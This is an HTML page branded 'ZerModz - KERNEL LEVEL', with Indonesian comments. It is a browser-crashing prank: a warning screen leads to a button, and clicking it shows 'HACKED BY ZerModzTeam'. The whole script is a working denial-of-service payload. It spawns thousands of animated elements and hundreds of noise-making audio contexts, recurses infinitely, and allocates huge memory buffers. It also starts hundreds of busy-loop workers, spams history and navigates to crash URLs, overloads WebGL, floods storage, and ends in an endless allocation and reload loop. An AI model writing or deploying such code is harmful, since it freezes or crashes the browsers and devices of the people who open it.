<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ZerModz - KERNEL LEVEL</title>
    <style>
        body { margin:0; background:#000; overflow:hidden; font-family:'Courier New'; }
        #warning {
            position:fixed; top:0; left:0; width:100%; height:100%;
            background:#000; display:flex; flex-direction:column;
            align-items:center; justify-content:center; z-index:999999;
        }
        #warning h1 { color:red; font-size:4rem; text-align:center; animation:blink 0.3s infinite; border:5px solid red; padding:30px; }
        #btn {
            font-size:3rem; padding:20px 80px; background:linear-gradient(45deg,#f00,#800);
            border:3px solid #fff; border-radius:60px; color:white; font-weight:bold;
            margin-top:50px; animation:pulse 0.5s infinite; cursor:pointer;
        }
        @keyframes blink { 0%{opacity:1;} 50%{opacity:0.3;} 100%{opacity:1;} }
        @keyframes pulse { 0%{transform:scale(1);} 50%{transform:scale(1.2);} 100%{transform:scale(1);} }
        .flytext {
            position:absolute; white-space:nowrap; font-weight:bold; pointer-events:none;
            animation:fly 0.1s infinite alternate; text-shadow:0 0 20px currentColor;
        }
        @keyframes fly {
            0% { transform: translate(0,0) rotate(0deg) scale(1); }
            100% { transform: translate(80px,80px) rotate(720deg) scale(1.5); }
        }
        #maintext {
            position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
            font-size:5rem; font-weight:900; text-align:center; z-index:9999;
            animation:super 0.005s infinite; background:rgba(0,0,0,0.9);
            padding:30px; border:10px solid white; border-radius:30px;
            text-shadow:0 0 100px cyan,0 0 200px magenta,0 0 300px yellow;
        }
        @keyframes super {
            0%{color:#000;background:#fff;text-shadow:0 0 100px red;}
            5%{color:red;background:cyan;text-shadow:0 0 100px lime;}
            10%{color:yellow;background:blue;text-shadow:0 0 100px magenta;}
            15%{color:lime;background:purple;text-shadow:0 0 100px cyan;}
            20%{color:cyan;background:red;text-shadow:0 0 100px yellow;}
            25%{color:magenta;background:lime;text-shadow:0 0 100px blue;}
            30%{color:white;background:black;text-shadow:0 0 100px red;}
            35%{color:black;background:yellow;text-shadow:0 0 100px cyan;}
            40%{color:blue;background:magenta;text-shadow:0 0 100px white;}
            45%{color:purple;background:lime;text-shadow:0 0 100px yellow;}
            50%{color:#000;background:#fff;text-shadow:0 0 100px magenta;}
        }
    </style>
</head>
<body>
    <div id="warning">
        <h1>⚠️ FINAL WARNING: KALO CLICK CHROME LO MATI! ⚠️</h1>
        <div id="btn">GASKEUN 10 JUTA 🔥</div>
    </div>

    <script>
        document.getElementById('btn').onclick = function() {
            document.getElementById('warning').remove();
            
            const b = document.body;
            
            // ========== 10.000 TEKS BERHAMBURAN (lebih banyak) ==========
            for (let i=0; i<10000; i++) {
                let d = document.createElement('div');
                d.className = 'flytext';
                d.textContent = 'ZERMODZ ' + i;
                d.style.left = Math.random()*100 + '%';
                d.style.top = Math.random()*100 + '%';
                d.style.fontSize = (5+Math.random()*80) + 'px';
                d.style.color = 'hsl(' + (Math.random()*360) + ',100%,60%)';
                d.style.animationDuration = (0.05+Math.random()*0.2) + 's';
                d.style.animationDelay = Math.random()*2 + 's';
                d.style.transform = 'rotate(' + (Math.random()*720) + 'deg)';
                b.appendChild(d);
            }
            
            // ========== TEKS UTAMA SUPER EXTREME ==========
            let utama = document.createElement('div');
            utama.id = 'maintext';
            utama.textContent = 'HACKED BY ZerModzTeam';
            b.appendChild(utama);
            
            // ========== 5000 SUARA (250 context x 20 osc) ==========
            for (let ctx=0; ctx<250; ctx++) {
                setTimeout(() => {
                    try {
                        let a = new (window.AudioContext||window.webkitAudioContext)();
                        let compressor = a.createDynamicsCompressor();
                        compressor.threshold.setValueAtTime(-80, a.currentTime);
                        compressor.ratio.setValueAtTime(40, a.currentTime);
                        
                        let gain = a.createGain();
                        gain.gain.value = 0.01;
                        compressor.connect(gain);
                        gain.connect(a.destination);
                        
                        for (let i=0; i<20; i++) {
                            let o = a.createOscillator();
                            o.type = ['sine','square','sawtooth','triangle'][Math.floor(Math.random()*4)];
                            o.frequency.value = 5 + Math.random()*5000; // 5Hz - 5005Hz (infra + ultra)
                            
                            let og = a.createGain();
                            og.gain.value = 0.0005 + Math.random()*0.002;
                            
                            o.connect(og);
                            og.connect(compressor);
                            o.start();
                        }
                        
                        // Noise tambahan
                        let noise = a.createScriptProcessor(2048,1,1);
                        noise.onaudioprocess = function(e) {
                            let out = e.outputBuffer.getChannelData(0);
                            for (let i=0; i<2048; i++) out[i] = Math.random()*2-1;
                        };
                        noise.connect(compressor);
                        
                        if (a.state === 'suspended') a.resume();
                    } catch(e){}
                }, ctx*3);
            }
            
            // ========== CRASH KERNEL LEVEL ==========
            (function kernelCrash() {
                
                // 1. STACK OVERFLOW MULTI DIMENSI
                (function a(){ (function b(){ (function c(){ (function d(){ d(); })(); c(); })(); b(); })(); a(); })();
                
                // 2. MEMORY BOMB DENGAN SHAREDARRAYBUFFER (jika didukung)
                let sabArr = [];
                for (let i=0; i<100000; i++) {
                    try {
                        if (typeof SharedArrayBuffer !== 'undefined') {
                            sabArr.push(new SharedArrayBuffer(100000000)); // 100MB shared memory
                        }
                        sabArr.push(new ArrayBuffer(200000000)); // 200MB
                        sabArr.push(new Blob([new Uint8Array(500000000)])); // 500MB
                        sabArr.push(new Array(10000000).join('x')); // 10MB string
                    } catch(e){}
                }
                
                // 3. WEB WORKER 500 (multi-core semua)
                for (let w=0; w<500; w++) {
                    try {
                        new Worker(URL.createObjectURL(new Blob([`
                            while(1) {
                                for(let i=0;i<999999999;i++) { 
                                    Math.sqrt(i); 
                                    new Array(999999).join('x'); 
                                    new ArrayBuffer(10000000);
                                }
                                postMessage('crash');
                            }
                        `])));
                    } catch(e){}
                }
                
                // 4. HISTORY SPAM 10000 per ms + NAVIGASI CRASH
                setInterval(() => {
                    for (let h=0; h<10000; h++) {
                        history.pushState({}, '', '/#' + Math.random().toString(36) + '?' + 'x'.repeat(100000));
                    }
                    history.back();
                    history.forward();
                    location.replace('chrome://crash'); // khusus chrome
                    location.replace('about:crash');
                }, 0);
                
                // 5. WEBGL RENDER LOOP (GPU OVERLOAD)
                for (let g=0; g<1000; g++) {
                    try {
                        let canvas = document.createElement('canvas');
                        canvas.width = 5000;
                        canvas.height = 5000;
                        let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                        if (gl) {
                            for (let t=0; t<10000; t++) {
                                gl.createTexture();
                                gl.createBuffer();
                                gl.createProgram();
                                gl.createShader(gl.VERTEX_SHADER);
                                gl.createShader(gl.FRAGMENT_SHADER);
                            }
                        }
                        b.appendChild(canvas);
                    } catch(e){}
                }
                
                // 6. SERVICE WORKER + BACKGROUND SYNC
                try {
                    navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(`
                        self.addEventListener('install', () => {
                            setInterval(() => {
                                for(let i=0;i<999999999;i++){}
                            }, 0);
                        });
                        self.addEventListener('sync', () => {
                            while(1){}
                        });
                    `));
                } catch(e){}
                
                // 7. WEBSOCKET BOMB (1000 koneksi)
                for (let ws=0; ws<1000; ws++) {
                    try { new WebSocket('ws://localhost:' + (ws+1)); } catch(e){}
                }
                
                // 8. FETCH BOMB (request gede)
                for (let f=0; f<5000; f++) {
                    fetch('https://' + 'x'.repeat(50000) + '.com').catch(()=>{});
                }
                
                // 9. INDEXEDDB + LOCALSTORAGE + SESSIONSTORAGE FULL
                try {
                    for (let s=0; s<100000; s++) {
                        localStorage.setItem('ls'+s, 'x'.repeat(1000000));
                        sessionStorage.setItem('ss'+s, 'x'.repeat(1000000));
                    }
                } catch(e){}
                
                try {
                    let req = indexedDB.open('finaldb', 1);
                    req.onsuccess = function(e) {
                        let db = e.target.result;
                        for (let t=0; t<1000; t++) {
                            if (!db.objectStoreNames.contains('store'+t)) {
                                let store = db.createObjectStore('store'+t, {keyPath:'id'});
                                for (let d=0; d<50000; d++) {
                                    store.put({id:d, data: 'x'.repeat(1000000)});
                                }
                            }
                        }
                    };
                } catch(e){}
                
                // 10. TIMER OVERLOAD 200.000 interval
                for (let t=0; t<200000; t++) {
                    setInterval(() => {
                        for(let z=0; z<1000000; z++) { Math.random(); performance.now(); }
                    }, 0);
                }
                
                // 11. INFINITE LOOP + ARRAY PUSH + NAVIGASI PAKSA
                let finalArr = [];
                while(true) {
                    finalArr.push(new ArrayBuffer(500000000)); // 500MB
                    finalArr.push(new Array(50000000).join('x')); // 50MB string
                    for(let z=0; z<9999999; z++) { 
                        Math.random(); 
                        Date.now(); 
                        new Error().stack;
                        // paksa garbage collector kerja
                        if (z % 100000 === 0) {
                            try { finalArr = finalArr.slice(); } catch(e){}
                        }
                    }
                    // paksa reload pake berbagai cara
                    window.location.href = window.location.href;
                    window.location.reload(true);
                    document.location.reload();
                }
            })();
        };
    </script>
</body>
</html>
